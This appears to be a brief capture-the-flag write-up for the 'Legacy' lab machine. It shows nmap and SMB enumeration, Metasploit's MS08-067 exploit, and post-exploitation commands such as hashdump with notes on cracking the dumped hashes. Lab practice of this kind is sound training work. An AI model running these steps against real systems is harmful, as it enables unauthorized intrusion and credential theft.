# Legacy

## Nmap

```bash
    nmap -A -T4 -p- 10.10.10.4
```

Opened ports:

- 139
- 445

Purpose OS:  Windows XP
NetBIOS name: Legacy
smb-security-mode (last of 2 lines)

### Resume

SMB is target for attack.

## SMB

Try to connect

```bash
    smbclient -L 10.10.10.4 #login without password
```

Resume. Dead end.

Try detect SMB version.

```bash
    msfconsole
    # load
    search smb_version
    use
    set rhosts 10.10.10.4
    exploit
```

Google detected version for SMB Windows XP
https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi
Follow instruction.

Opened reverse shell of metasploit

```bash
    getuid #  res is NT authority\system
    sysinfo # system info for identify victim
    hashdump # passwords hashes. First part  can be crack JohnRipper. Second part crack mapZack or PSAZack
    ## Look for sensitive files
    shell # Go to victim shell (There are flags store on the desktop each user)
```